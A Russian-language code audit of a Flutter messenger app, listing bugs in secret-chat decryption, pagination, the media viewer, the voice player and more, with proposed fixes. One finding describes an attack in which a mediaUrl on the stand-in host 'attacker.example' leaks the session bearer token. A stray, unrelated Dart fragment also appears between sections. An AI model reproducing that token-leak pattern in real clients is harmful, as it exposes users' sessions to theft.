## 🔴 Блокеры (6)

### ПЛАВ-1 · `loadOlder` перешифровывает весь список и ломает секретные чаты

`ChatMessagesNotifier.loadOlder`:

```dart
merged.sort(_compareMessages);
final List<ApiMessage> decrypted = await _decryptE2eeMessages(merged);
state = AsyncData<List<ApiMessage>>(decrypted);
await _saveToCache(decrypted);
```

Два независимых дефекта в трёх строках.

Первый — производительность. `_decryptE2eeMessages` получает **весь** склеенный список, а не 50 новых сообщений. Внутри — последовательный `for` с `await e2eeService.decryptE2EEMessage(...)` на каждое сообщение, на главном изоляте. После пятой страницы в чате 330 сообщений, и каждая следующая догрузка прогоняет Double Ratchet по всем 330. Сложность O(n²) по числу страниц. Это ровно то, что чувствуется как «дёрганая догрузка»: чем выше листаешь, тем дольше висит спиннер.

Второй — корректность, и он хуже. После первого `_fetch` расшифрованные сообщения лежат в состоянии как `msg.copyWith(content: decrypted)` — то есть `content` уже открытый, но `isE2ee` остался `true` и `e2eeContent` остался непустым. В `loadOlder` проверка `if (!msg.isE2ee || msg.e2eeContent == null)` их **не отсекает**, и они идут в `decryptE2EEMessage` повторно. У Double Ratchet ключ сообщения уничтожается после использования — в этом весь смысл forward secrecy. Повторная расшифровка падает, попадает в `catch`, и в `result` добавляется `msg` **с сырым шифротекстом обратно**. Затем `_saveToCache` записывает это на диск.

Итог: пролистал вверх в секретном чате — часть уже прочитанных сообщений превратилась в мусор, и мусор сохранился в кэш.

Правильно: расшифровывать только `older`, склеивать уже готовые, и снимать `e2eeContent`/`isE2ee` (или добавить флаг `isDecrypted`) после успешной расшифровки.

### ПЛАВ-2 · Секретный чат из пуша сохраняет шифротекст в кэш

```dart
Future<List<ApiMessage>> _decryptE2eeMessages(List<ApiMessage> messages) async {
  final partnerPublicKey = await _getPartnerPublicKey();
  if (partnerPublicKey == null) {
    return messages.where((ApiMessage m) => _parseHeloMessage(m) == null).toList();
  }
```

`_getPartnerPublicKey` читает `ref.read(chatByIdProvider(_chatId))`, то есть сводку чата из локального состояния. При открытии по диплинку или из пуш-уведомления `chatsProvider` ещё не загрузился, сводки нет, `partnerPublicKey` — `null`, и функция возвращает сообщения **вообще без расшифровки**. Дальше `_fetch` вызывает `_saveToCache`, и шифротекст уходит в `EncryptedMessageCache` как будто это контент. При следующем открытии чата из кэша читается мусор.

Это тот же корень, что и ЧАТ-21 (`_applySecureFlag` читает незагруженную сводку и не включает защиту от скриншотов). Один и тот же баг проявляется дважды, и оба раза именно в секретных чатах. Нужен `await ref.read(chatsProvider.future)` либо отдельный запрос ключа партнёра по `chatId` перед расшифровкой, с явной ошибкой вместо тихого прохода.

### ФЕТЧ-1 · Токен сессии уходит на произвольный домен из содержимого сообщения

`WsMediaFetcher._httpDownload`:

```dart
if (cleanPath.startsWith('http://') || cleanPath.startsWith('https://')) {
  final http.Response directResp = await _httpClient.get(
    Uri.parse(cleanPath),
    headers: <String, String>{
      if (token.isNotEmpty) 'Authorization': 'Bearer $token',
    },
  );
```

`cleanPath` приходит из `mediaUrl` сообщения, то есть из данных, которые контролирует отправитель. Сообщение с `mediaUrl: https://attacker.example/x.jpg` заставляет клиент отправить **bearer-токен сессии** на сервер атакующего. Достаточно одного сообщения в любом чате, и превью подгрузится автоматически.

Нужен allowlist по хосту (`ApiConstants.origin` и явно разрешённые CDN) и отправка `Authorization` только на свой origin. Заодно `_cleanFilePath` для внешних URL собирает путь из сегментов, что тоже стоит запретить.

### ОБОИ-1 · Полноэкранный `ui.Image` не освобождается плюс цикл перерисовки при смене темы

`_ChatWallpaperBackgroundState`:

```dart
setState(() {
  _renderedImage = newImage;
  ...
});
```

Предыдущий `ui.Image` нигде не `dispose()`. Один кадр обоев на экране 1080×2400 при `pixelRatio` 2 — это 2160×4800×4 байта, около 41 МБ нативной памяти. Утекает при каждой перерисовке.

А перерисовок много. `_triggerRenderIfNeeded` вызывается **из `build`** и сравнивает `_lastScheme == scheme`. Во время анимации смены темы (`CircularThemeReveal`) схема меняется каждый кадр, поэтому: рендер → `setState` → новый кадр → схема уже другая → снова рендер. `_isRendering` не спасает, он только сериализует итерации. Каждая итерация — полноэкранный `PictureRecorder` плюс `toImage`. За одно переключение темы это десятки мегабайт утечки и десятки полноэкранных растеризаций.

Это закрывает мой давний открытый вопрос про `_BackdropImageCache` — утечка подтверждена, и она здесь.

Лечится: `_renderedImage?.dispose()` перед присваиванием, сравнение схемы по идентичности сгенерированного ключа палитры (а не по объекту `ColorScheme`), и рендер по debounce после окончания анимации темы, а не на каждый кадр.

List<double> _generateWaveform(int seed) {
  final math.Random rng = math.Random(seed);
  ...
  final double envelope = math.sin(math.pi * i / 49);

### МЕДВ-1 · Из чата медиа открывается без плейлиста

`MediaViewerScreen` умеет плейлист (`playlist`, `initialIndex`, `PageView.builder`), но из пузыря сообщения роут получает `extra: message.e2eeFileKey` — просто строку. Плейлист приходит только из медиа-табов профиля, где передаётся `Map` с `playlist`/`initialIndex`/`e2eeKey`.

Следствие: открыл фото в переписке — **свайпнуть на следующее нельзя**, только назад и заново. В любом эталонном мессенджере это базовое поведение. Плюс сам факт двух несовместимых форм `extra` на одном роуте (ЧАТ-27) — роутер обязан различать `String` и `Map`.

## ПЛАВ — листание, догрузка, открытие (17)

- **ПЛАВ-3** `await _saveToCache(decrypted)` внутри `loadOlder` — полное перешифрование и перезапись **всего** списка на диск плюс `ChatMediaCache.saveMediaMessages` по всему списку, и всё это `await` до возврата из `loadOlder`. Спиннер догрузки висит ровно столько, сколько длится дисковая запись.
- **ПЛАВ-4** `merged.sort(_compareMessages)` — полная сортировка всего списка на каждую страницу, хотя добавляется отсортированный блок в начало. `_compareMessages` дёргает `resolvedSentAt` по O(n log n) раз.
- **ПЛАВ-5** В самом ноутифаере нет флага «идёт догрузка». Защита живёт только в экране (`_loadingOlderNotifier`), а `profile_shared_media_tab_view` вызывает `loadOlder(pageSize: 300)` **на том же провайдере** без всякой координации. Две одновременные догрузки читают один и тот же `current.first.id`, обе делают запрос, обе присваивают `state` — одна страница молча теряется.
- **ПЛАВ-6** `state = AsyncData(новый список)` меняет идентичность списка, а `chat_message_list._syncCaches` пересобирает `_layoutCache`, `_byIdCache`, `_idToIndexCache` и чистит `_messageKeys` **внутри `build`**. То есть каждая догрузка выбрасывает кэш раскладки по всем сообщениям. Вместе с `addAutomaticKeepAlives: false` и `addRepaintBoundaries: false` это перестройка и перерисовка всех видимых сообщений в момент догрузки.
- **ПЛАВ-7** Открытие чата полностью последовательное: `await EncryptedMessageCache.loadMessages` (чтение и расшифровка с диска) → `await getHistory(pageSize: 80)` → последовательная DR-расшифровка 80 сообщений → `saveMessages` (обратное шифрование и запись) → `saveMediaMessages`. Параллелить нечего, всё в цепочке. Правило 8 протокола («parallelized cold start») здесь не выполняется вообще. Сетевой запрос надо стартовать **до** чтения кэша, а не после.
- **ПЛАВ-8** `pageSize: 80` на первый экран, где видно ~10 сообщений. Восьмикратный перебор, и каждое из 80 требует расшифровки перед первым кадром.
- **ПЛАВ-9** Сервер не отдаёт признак «есть ещё». Конец истории определяется только через `older.isEmpty`, а страница, целиком состоящая из дубликатов, даёт `added == 0` и неотличима от конца. Пагинация может либо встать раньше времени, либо долбить один и тот же запрос.
- **ПЛАВ-10** `ChatsNotifier._fetch` перед списком чатов делает `await setPublicKey(publicKey)`. То есть каждый pull-to-refresh списка чатов — два последовательных сетевых запроса, и чаты не загрузятся, пока не отправится публичный ключ. Ключ надо отправлять один раз при логине, а не на каждый фетч.
- **ПЛАВ-11** `_handleNewMessagePush` на **каждое** входящее сообщение делает полную `updated.sort(...)` по всем чатам, затем `state = AsyncData(updated)`, затем `saveChats(updated)` — дисковая запись. Вместе с ЧАТ-30 (мёртвый `findChildIndexCallback`) это полная пересборка элементов списка чатов на каждое сообщение.
- **ПЛАВ-12** Снятие оптимистичного сообщения по **совпадению текста**:
    
    ```dart
    if (finalMessage.senderId == myUserId) {
      next.removeWhere((m) => m.id < 0 && m.content == finalMessage.content);
    }
    ```
    
    Отправил «ок» два раза подряд — эхо первого удаляет **оба** оптимистичных сообщения. У медиа `content` пустой, поэтому эхо любого своего сообщения с пустым текстом сносит **все** висящие загрузки. Сопоставлять надо по `localId`/`tempId`, который уже есть.
    
- **ПЛАВ-13** `NotificationStorage.createAndSave` вызывается безусловно, а подавляется только всплывашка (`PushNotificationService.currentChatId != message.chatId`). Сидишь в чате и читаешь — в центре уведомлений копятся записи о каждом прочитанном сообщении.
- **ПЛАВ-14** `_playNotificationSound(volume: 0.65)` вызывается в конце **своей** отправки. То есть на свои сообщения играет звук `AppSound.message`, тот же, что на входящие.
- **ПЛАВ-15** `_parseHeloMessage` фильтрует любое сообщение, чей текст начинается с `{"dh"`, причём в **любом** direct-чате, где у партнёра есть публичный ключ (проверки `isSecret` в этой ветке нет — она есть только в `send`). Пользователь, отправивший такой JSON в обычной переписке, увидит, что сообщение молча исчезло из UI.
- **ПЛАВ-16** `_decryptE2eeMessages` — последовательный цикл с `await` на главном изоляте. 80 сообщений это 80 последовательных криптооперации перед первым кадром. Кандидат на `compute`/изолят либо на пакетную расшифровку.
- **ПЛАВ-17** `ChatMessagesNotifier` дёргает приватные методы соседнего класса: `ref.read(chatsProvider.notifier)._handleReadPush(...)`, `._handleNewMessagePush(...)`, `._handleEditedPush(...)`, `._handleDeletedPush(...)`. Работает только потому, что классы в одном файле. Нужен публичный API синхронизации.

## МЕДВ — просмотрщик медиа: почему он выглядит дёшево (17)

Это ответ на «дизайн открытия медиа мне не нравится». Проблема не в одной детали, а в том, что открытие сделано как переход на обычный экран, а не как раскрытие фотографии.

- **МЕДВ-2 · Нет shared-element перехода.** Тап по фото делает `context.push('/media-viewer')`, роут отдаёт `MaterialPage`, то есть снизу выезжает целый новый экран со своим AppBar. В эталонах фотография увеличивается из самого пузыря на затемняющийся фон. `Hero` в проекте уже используется (`Hero(tag: 'chat_avatar_$chatId')` в шапке чата), инфраструктура есть.
- **МЕДВ-3 · Чёрный экран со спиннером вместо мгновенной картинки.** `_FullScreenImage.initState` проверяет `WsMediaFetcher.getMemoryCachedBytes` — это правильно, но кэш памяти отказывается хранить записи больше 3 МБ (`_maxSingleEntryBytes`). Полноразмерное фото туда не попадает, значит `getMemoryCachedBytes` возвращает `null`, и вместо уже раскодированной миниатюры из пузыря показывается `AppLoadingIndicator` на фоне `scheme.scrim`. Открытие большого фото = чёрный экран и кружок.
- **МЕДВ-4 · Нет закрытия свайпом вниз.** `PhotoView` без drag-to-dismiss, единственный выход — стрелка назад. В эталонах картинка тянется за пальцем, уменьшается и отлетает обратно в пузырь.
- **МЕДВ-5 · `PopScope` уводит в список чатов.** При `canRoutePop == false` (открытие по диплинку) «назад» делает `context.go('/main/chats')` — вместо закрытия просмотрщика пользователя выбрасывает в список чатов.
- **МЕДВ-6 · Хром всегда на экране.** AppBar с `scheme.surface.withValues(alpha: 0.85)` висит поверх фото постоянно. Нет тапа для скрытия панелей.
- **МЕДВ-7 · `backgroundColor: scheme.scrim` у `Scaffold`.** `scrim` — роль затемняющего слоя под модалкой, а не фона экрана. Дублируется в `PhotoView(backgroundDecoration:)`. Правильно: прозрачный `Scaffold` поверх анимируемого барьера `scrim`.
- **МЕДВ-8 · Счётчик захардкожен по-русски:** `'${_currentIndex + 1} из ${_playlistItems.length}'`. Плюс цифры без `FontFeature.tabularFigures()`, поэтому заголовок дёргается при свайпе.
- **МЕДВ-9 · Все видео в плейлисте инициализируются сразу.** `PageView.builder` строит соседей, каждый `_InlineVideoPlayer.initState` вызывает `_init()` → `fetchToLocalFile` (полное скачивание) плюс `VideoPlayerController.initialize()`. Свайп по галерее с видео = скачивание и инициализация всех.
- **МЕДВ-10 · Два независимых пути для одиночного и плейлистного режима.** В `_buildBody` ветка плейлиста использует `_FullScreenImage`/`_InlineVideoPlayer`, а одиночная — экранные `_videoController`/`_chewieController`. Логика видео продублирована, и в одиночной ветке есть `deviceOrientationsAfterFullScreen`, а в плейлистной нет. Одно и то же видео из чата и из медиа-табов ведёт себя по-разному.
- **МЕДВ-11 · Мёртвое состояние.** `initState` вызывает `_initMedia()` только при `!_hasPlaylist`, поэтому в плейлистном режиме `_initialized`, `_videoController` и `_chewieController` уровня экрана не используются никогда.
- **МЕДВ-12 · `launchUrl(..., LaunchMode.externalApplication)`** в `_buildFallback` — третий обход `AppUrlLauncher` после МЕД-8.
- **МЕДВ-13 · «Скачать» сохраняет в песочницу.** `getApplicationDocumentsDirectory()` — приватный каталог приложения, в галерее и в «Файлах» файла не будет. Тост при этом показывает `mediaSavedTo(savePath)` с путём вида `/data/user/0/.../photo.jpg`, который пользователь открыть не сможет.
- **МЕДВ-14 · Скачивание качает файл второй раз.** `_downloadCurrentMedia` идёт в `chatRepository.downloadMedia`, игнорируя уже полученные байты и дисковый кэш `WsMediaFetcher`. Фотографию, на которую смотришь, приложение скачивает заново.
- **МЕДВ-15 · Имя файла без расширения и без санитизации.** `current.mediaName ?? current.title ?? 'download'`. Расширение не гарантировано, а `mediaName` со слэшем пишет за пределы каталога.
- **МЕДВ-16 · `MemoryImage(_bytes!)` без ограничения декодирования.** 12-мегапиксельное фото разворачивается в полном разрешении (около 48 МБ ARGB) в кэш изображений. Три-четыре фото подряд на среднем телефоне — риск OOM.
- **МЕДВ-17 · `AppErrorFormatter.format(_error).toString()`** — `.toString()` поверх результата форматтера. Либо no-op, либо в UI попадёт имя типа.
- **МЕДВ-18 · Нет сброса зума при смене страницы** и нет индикации, что картинку можно зумить.

### Что делать с просмотрщиком — конкретный M3E-спек

1. **Переход.** Пузырь оборачивается в `Hero(tag: 'media_${message.id}_$index')`, картинка в просмотрщике — в парный `Hero` с тем же тегом. `flightShuttleBuilder` интерполирует `BoxFit.cover` → `BoxFit.contain`, чтобы кадрирование не прыгало. Роут переводится с `MaterialPage` на `CustomTransitionPage` с `opaque: false`, барьер `scheme.scrim` анимируется от 0 до 1, 300 мс на вход и 250 мс на выход, кривая `M3SpringCurves.spatial`. Визуально фотография поднимается из переписки, а не заезжает новый экран.
2. **Мгновенный первый кадр.** Ввести в `WsMediaFetcher` отдельный ярус кэша под миниатюры (ключ с `cacheWidth`), лимит на запись поднять только для этого яруса. Просмотрщик сначала рисует миниатюру растянутой, сверху доезжает полноразмерная. Спиннер на пустом фоне не показывать никогда.
3. **Закрытие жестом.** Вертикальный `GestureDetector` поверх `PhotoViewGestureDetectorScope`: сдвиг за пальцем, масштаб от 1 до 0.85 на 180 px, барьер гаснет пропорционально. Отпускание после 25 % пути или при скорости выше 800 px/s — `Navigator.pop` с обратным полётом `Hero`.
4. **Хром по тапу.** Одиночный тап переключает верхнюю и нижнюю панели через `AnimatedSlide` плюс `FadeTransition` на 200 мс. При открытии панели видны 2.5 с, затем скрываются.
5. **Нижняя панель действий.** Вместо одинокой иконки скачивания в AppBar — пилюля `surfaceContainerHigh` с радиусом из `AppRadii`: «Поделиться», «Сохранить», «Переслать», «Удалить», «Ещё». Это M3E-паттерн и заодно закрывает отсутствие пересылки медиа прямо из просмотрщика.
6. **Плейлист везде.** Логику сборки списка медиа вынести из `profile_shared_media_tab_view._extractPhotosAndVideos` в общий хелпер и использовать в чате. `extra` всегда `Map`, строковая форма удаляется вместе с ветвлением в роутере.
7. **Видео.** Один `_MediaPage`, который создаёт `ChewieController` только при `isActive` и уничтожает при уходе со страницы; соседи показывают только постер. `deviceOrientationsAfterFullScreen` задаётся в одном месте.
8. **Сохранение.** Системная галерея через media-store, байты берутся из `WsMediaFetcher`, имя санитизируется, расширение выводится из `mediaType`. Тост — «Сохранено в галерею», без пути.
9. **Декодирование.** `ResizeImage(MemoryImage(bytes), width: (ширина экрана × dpr).round())` вместо голого `MemoryImage`.
10. **Локализация.** Ключ `mediaViewerCounter(current, total)` в ARB, цифры с `tabularFigures`.

## ГОЛОС — плеер голосовых (11)

Самый тяжёлый виджет в списке сообщений после медиа.

- **ГОЛОС-2** `AudioPlayer` создаётся **в каждом** `VoiceMessagePlayer`. При `addAutomaticKeepAlives: false` каждое голосовое, вошедшее в вьюпорт, поднимает платформенный плеер `just_audio`, а при уходе из вьюпорта уничтожает. Это платформенный round-trip на каждый скролл. В чате с двадцатью голосовыми это основной источник дёрганья при листании. Нужен один общий плеер плюс лёгкий виджет-представление.
- **ГОЛОС-3** `_initAudioSession()` вызывается в `initState` каждого экземпляра — глобальная `AudioSession` переконфигурируется по разу на каждое голосовое, проезжающее мимо. Конфигурировать надо один раз на приложение.
- **ГОЛОС-4** `_setupPlayer()` в `initState` сразу зовёт `fetchToLocalFile`, то есть **скачивает аудио** для каждого голосового во вьюпорте, не дожидаясь тапа и не спрашивая `autoDownloadAllowedProvider` (который `ws_cached_image` уважает). Пролистал тридцать голосовых — скачал тридцать файлов.
- **ГОЛОС-5** Анимируемая тень на кнопке play:
    
    ```dart
    boxShadow: [BoxShadow(color: fg.withValues(alpha: 0.3), blurRadius: playing ? 12 : 6, spreadRadius: playing ? 2 : 0, ...)]
    ```
    
    внутри `AnimatedContainer(150ms)`. Растровое размытие, которое ещё и анимируется, на элементе прокручиваемого списка. Правило 1 протокола и запрет `BoxShadow` в конвенциях репозитория.
    
- **ГОЛОС-6** `_posSub` делает `setState` на **каждый** тик позиции (4–10 Гц) и перестраивает весь виджет: `Row`, тексты, иконки, галочки. `CustomPaint` обёрнут в `RepaintBoundary` (правильно), но `setState` всё равно перестраивает всё, что выше. Нужен `ValueNotifier` плюс `AnimatedBuilder` только вокруг осциллограммы и счётчика.
- **ГОЛОС-7** `_stateSub` делает пустой `setState(() {})` на любое изменение состояния плеера.
- **ГОЛОС-8** `onTapDown` сразу перематывает. Тап в любое место осциллограммы — мгновенный seek, никакого «просто нажать» не существует. Плюс `onHorizontalDragUpdate` здесь **перехватывает свайп-ответ** из `_SwipeToReply`: на голосовых свайпом ответить нельзя, вместо этого идёт перемотка.
- **ГОЛОС-9** `_seeking` выставляется только в `onHorizontalDragStart`/`End`. `onTapDown` его не ставит, поэтому тап-перемотку может тут же перезаписать очередной тик позиции — ползунок отскакивает назад.
- **ГОЛОС-10** `_duration = Duration(seconds: widget.durationSeconds)` использует длительность, которая может быть подделанной (`?? 30` из МЕД-7), пока не приедет `durationStream`. Счётчик остатка стартует неправильным и потом прыгает.
- **ГОЛОС-11** Запись идёт через `audio_waveforms`, воспроизведение через `just_audio` плюс `audio_session`, видео через `video_player`/`chewie`. Три-четыре аудио-видео стека в одном приложении. Стоит свести запись и воспроизведение к одному.

## КМЕНЮ — контекстное меню сообщения (9)

- **КМЕНЮ-1** Быстрые реакции — `GestureDetector` плюс `Container`, **без** `TouchContainer`, `InkWell` и любой обратной связи. Шесть кнопок реакций нажимаются «в никуда».
- **КМЕНЮ-2** `_CompactActionTile` вешает `InkWell` **над** `Container` с непрозрачным `BoxDecoration(color: surfaceContainerHigh)`. Рябь рисуется под непрозрачным контейнером и не видна. То есть и все семь действий тоже без визуального отклика. Нужен `Material` с `clipBehavior` либо `Ink`.
- **КМЕНЮ-3** `_QuickReaction` носит поле `icon` с шестью `IconData`, которое **не используется нигде**.
- **КМЕНЮ-4** Действия свёрстаны `Wrap` из чипов разной ширины, поэтому раскладка непредсказуема: «Удалить» и «Пожаловаться» (цвет `error`) могут оказаться вплотную к «Ответить». В M3 деструктивные действия отделяют и ставят последними. Здесь это прямой риск промаха.
- **КМЕНЮ-5** `_quickReactions` — константа из шести эмодзи, не связанная ни с частыми реакциями пользователя, ни с `_allReactionEmojis` (25) в экране чата.
- **КМЕНЮ-6** Нет выбора нескольких сообщений. Ни здесь, ни где-либо ещё в приложении: переслать или удалить пачку сообщений невозможно. Для мессенджера это заметная функциональная дыра.
- **КМЕНЮ-7** Нет «Закрепить» — при этом в списке чатов `ChatTile` имеет параметр `isPinned`, который никто не передаёт (ЧАТ-36). Закрепление сообщений и чатов не реализовано, но следы в API виджетов остались.
- **КМЕНЮ-8** `subtitle` с числом комментариев рендерится текстом внутри чипа, из-за чего чип становится сильно шире остальных и ломает `Wrap`.
- **КМЕНЮ-9** В превью `Icon(isMine ? Icons.check_rounded : Icons.person_rounded)` — галочка как признак «моё». Во всём остальном приложении галочка означает «доставлено», так что смысл читается неверно.
- Захардкоженные строки: `'🖼️ Стикер'`, `'🎤 Голосовое сообщение'`, `'📹 Видеосообщение'`, `'📎 Вложение'`, `'📎 $name'`.

## ХЕДЕР — шапка публичного профиля (8)

- **ХЕДЕР-1** Два `Opacity` с непрерывно интерполируемым значением оборачивают полноэкранные поддеревья. `Opacity` вне значений 0 и 1 вызывает `saveLayer` **на каждый кадр**, и здесь их два, причём именно в том элементе, который анимируется при любом скролле профиля. Правило 2 протокола. Это и есть «тяжёлый» профиль. Нужны `FadeTransition` поверх `RepaintBoundary` либо отсечение по порогу.
- **ХЕДЕР-2** Провал в анимации:
    
    ```dart
    final double expandedOpacity = (1.0 - progress * 2.2).clamp(0.0, 1.0);
    final double collapsedOpacity = ((progress - 0.55) * 2.2).clamp(0.0, 1.0);
    ```
    
    При `progress` от 0.4545 до 0.55 **оба** равны нулю. Примерно на 10 % диапазона сворачивания в шапке не видно ничего, кроме кнопки «назад» — заметная пустая вспышка при скролле.
    
- **ХЕДЕР-3** Два новых захардкоженных зелёных `Color(0xFF22C55E)` (точка онлайна и текст статуса в развёрнутом виде) плюс третий в свёрнутом. Итого по проекту **10** захардкоженных зелёных, причём **двух разных оттенков** (`0xFF4CAF50` и `0xFF22C55E`) для одного и того же состояния «онлайн» в разных экранах.
- **ХЕДЕР-4** `maxExtent = 230.0 + topInset` не масштабируется `textScaler`. При крупном шрифте колонка «имя плюс юзернейм плюс статус» не влезает в 230 dp и даёт `RenderFlex overflow` — ровно тот класс багов, который коммит `20745151` только что чинил в онбординге.
- **ХЕДЕР-5** `shouldRebuild` сравнивает `badges != oldDelegate.badges` по идентичности списка: пересозданный равный список всегда вызывает перестройку, а изменённый на месте — никогда.
- **ХЕДЕР-6** Нет `Hero` на аватаре. В шапке чата есть `Hero(tag: 'chat_avatar_$chatId')`, но в профиле парного тега нет — shared-element переход обрывается, аватар улетает в пустоту.
- **ХЕДЕР-7** Кнопки «назад» и «ещё» — 40×40, меньше минимальных 48 dp, без `tooltip` и без семантической метки. `Icon` без явного цвета наследует `IconTheme`, который на `surfaceContainerHigh` может не дать нужный контраст.
- **ХЕДЕР-8** Здесь `PulseAvatar` получает корректную пару `fallbackColor: scheme.primaryContainer` и `textColor: scheme.onPrimaryContainer`. Это доказывает, что `onPrimary` поверх `primaryContainer` в `chat_tile` (ЧАТ-37) — именно баг, а не принятая договорённость.

## ФЕТЧ — `ws_media_fetcher` (7)

- **ФЕТЧ-2** `_maxSingleEntryBytes = 3 МБ`: крупные фото никогда не попадают в кэш памяти, значит при каждом открытии читаются с диска и, для секретных чатов, **каждый раз заново расшифровываются** через `E2eeFileCrypto.decrypt`.
- **ФЕТЧ-3** `_download` ловит **любую** ошибку HTTP и уходит в WS-фолбэк `get_file`, который тащит файл в base64 через тот же сокет, по которому идут сообщения. Сорвавшаяся загрузка фото на 3 МБ превращается в 4 МБ base64 по WebSocket плюс `base64Decode` на главном изоляте.
- **ФЕТЧ-4** `prefetchBatch(concurrency: 8)` без ограничения по суммарному объёму — восемь параллельных полноразмерных загрузок (и это то, что вызывает МЕД-4 при открытии профиля).
- **ФЕТЧ-5** `DefaultCacheManager()` с конфигурацией по умолчанию: 200 объектов, 30 дней. Медиа сверх 200 файлов вытесняется независимо от того, что показывает экран «Хранилище».
- **ФЕТЧ-6** Токен сессии передаётся **в теле** POST-запроса (`{'token': ..., 'file_path': ...}`) вместо заголовка `Authorization`. Эндпоинт принимает учётные данные в body — это стоит переделать вместе с ФЕТЧ-1.
- **ФЕТЧ-7** `clearMemoryCache()` существует, но не вызывается ни на `didHaveMemoryPressure`, ни где-либо ещё. До 40 МБ раскодированного медиа держится в памяти бессрочно.
- **ФЕТЧ-8** `fetchToLocalFile` для неE2EE-пути не дедуплицируется: два одновременных вызова по одному пути оба доходят до `putFile`.

## ОБОИ — фон чата (5)

- **ОБОИ-2** `_renderedImage`, `_lastConfig`, `_lastScheme`, `_lastWidth`, `_lastHeight` присваиваются **внутри `build`** (в билдере `LayoutBuilder`) при попадании в синхронный кэш. Правило 6.
- **ОБОИ-3** `_triggerRenderIfNeeded` вызывается из `build` и планирует `setState` в postFrame — гарантированный второй кадр на любое изменение конфигурации, схемы или размера.
- **ОБОИ-4** `height = screenSize.height` игнорирует фактические ограничения: в разделённом окне на десктопе фон рендерится на всю высоту экрана, а не контейнера.
- **ОБОИ-5** Сравнение `_lastScheme == scheme` по объекту `ColorScheme` — во время анимации темы не совпадает никогда. Нужен ключ палитры (как в `app_theme` уже сделан XOR-ключ кэша).

## СКЕЛ — скелетоны загрузки (5)

- **СКЕЛ-1** Класс задокументирован как «Expressive Material 3 high-contrast tonal skeleton», у `PostFeedSkeleton` в докстроке написано «coordinated shimmer sweep», в pubspec лежит `shimmer ^3.0.0` — а **шиммера нет нигде**. Все скелетоны это статические `Container` с `surfaceContainerHighest`. Документация и зависимость обещают то, чего нет.
- **СКЕЛ-2** При этом в медиа-табах профиля плейсхолдеры анимируются через `flutter_animate` с бесконечным `repeat` на каждую плитку (МЕД-5). То есть в приложении **две несовместимые системы** плейсхолдеров: мёртвые серые блоки и бесконечные контроллеры на элемент.
- **СКЕЛ-3** `MessageListSkeleton` хардкодит радиусы пузырей 18/6 вместо `getBubbleRadius`. Скелетон не совпадает с выбранным пользователем радиусом, и форма визуально прыгает в момент подгрузки.
- **СКЕЛ-4** `ChatListSkeleton` хардкодит аватар 52 и радиус карточки 24, тогда как `ChatTile` использует `PulseAvatar(radius: 25)`, то есть 50. Скачок на 2 dp и смена формы при загрузке.
- **СКЕЛ-5** Все три скелетона — `ListView` с `NeverScrollableScrollPhysics` без `shrinkWrap` и без явной высоты; в неограниченном родителе это исключение. `MessageListSkeleton` вызывающих не найдено — вероятно мёртвый код.

## Критерии приёмки

- Листание чата на 500 сообщениях: p99 кадра ниже 16 мс, догрузка страницы не превышает 120 мс от порога скролла до отрисовки.
- Догрузка десяти страниц подряд в секретном чате: ни одно ранее расшифрованное сообщение не изменило текст.
- Открытие секретного чата из пуш-уведомления: защита от скриншотов включена, в кэше нет шифротекста.
- Сообщение с внешним `mediaUrl` не приводит к исходящему запросу с `Authorization` на чужой хост.
